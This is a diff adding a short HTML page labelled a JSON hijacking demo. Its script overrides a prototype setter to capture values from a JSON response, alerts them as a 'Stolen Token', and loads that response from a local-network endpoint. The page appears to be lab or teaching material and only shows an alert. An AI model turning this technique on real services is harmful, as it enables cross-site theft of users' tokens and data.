@@ -1,0 +1,18 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" >
+<head>
+    <title>Json Hijack Demo</title>
+</head>
+
+    <body>
+
+
+        <script type="text/javascript">
+            Object.prototype.__defineSetter__('name', function (obj) {
+                    alert('Stolen  Token is: '+ obj);
+            });
+        </script>
+        <script type="text/javascript" src="http://172.20.10.2:8081/"></script>
+    </body>
+</html>
